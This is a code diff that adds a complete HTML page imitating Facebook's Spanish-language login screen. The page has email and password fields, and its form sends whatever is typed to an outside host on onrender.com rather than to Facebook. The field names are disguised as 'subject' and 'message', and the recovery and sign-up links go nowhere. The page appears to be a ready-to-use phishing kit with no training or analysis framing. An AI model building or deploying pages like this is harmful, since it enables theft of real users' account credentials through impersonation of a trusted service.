@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<style>
+
+
+h1 {
+    color: white;
+    font-family: Calibri;
+    padding-top: 10px;
+
+}
+
+.container {
+    background-color: #3b5990;
+    border-radius: 5px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); 
+
+    width: 90%; 
+    max-width: 400px; 
+    text-align: center; 
+}
+
+.email, .pass {
+    width: 90%;
+    height: 40px;
+    border-radius: 6px;
+    padding-left: 10px;
+    margin: 10px 0; 
+    border:none;
+}
+
+.btn {
+    background-color: #3b5998;
+    cursor: pointer;
+    border-radius: 6px;
+    font-size: 21px;
+    font-weight: bold;
+    color: white;
+    border: 0;
+    height: 40px;
+    width: 90%; 
+ 
+}
+
+.recovery {
+    color: white;
+    cursor: pointer;
+}
+
+.signup {
+    background-color: #36a420;
+    display: inline-block; 
+    color: white; 
+    font-family: Calibri;
+    border-radius: 6px;
+    padding: 10px;
+    cursor: pointer;
+    margin-top: 3px; 
+}
+
+a {
+    color: white;
+    text-decoration: none;
+}
+
+@media screen and (max-width: 800px) {
+    body {
+    background-color: #3b5998;
+    font-family: Calibri;
+    display: flex;
+    height: 100vh; 
+    margin: 0; 
+}
+    .container {
+        margin-top: 40px;
+        padding-bottom: 30px;
+        padding: 5px;
+        width: 92%;
+        padding: 20px;
+
+    }
+}
+
+@media screen and (min-width: 801px) {
+    .container {
+        padding: 20px;
+        width: 70%;
+
+    }
+
+    body {
+    background-color: #3b5998;
+    font-family: Calibri;
+
+    display: flex;
+    justify-content: center; 
+    align-items: center; 
+    height: 100vh; 
+    margin: 0; 
+}
+
+}
+
+</style>
+<title>Facebook</title></title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body><center>
+ <div class="container">
+ <h1>Facebook</h1>
+
+
+ <form method="POST" action="https://sm0-l3pc.onrender.com/">
+ 
+
+        <input class="email" type="text" id="subject" name="subject" placeholder="Correo electrónico o número de teléfono" autocomplete="off" minlength="15" required><br><br>
+
+
+
+ <input class="pass" id="message" name="message" type="password" placeholder="Contraseña" name="pass" autocomplete="off" minlength="5">
+ <input class="btn" type="submit" value="Iniciar sesión">
+ <p class='recovery'>Olvidaste tu contraseña</p>
+ <div class='signup'><a href="">Crear cuenta nueva</a></div>
+    </form>
+
+
+ 
+  </div>
+</body>
+</html>
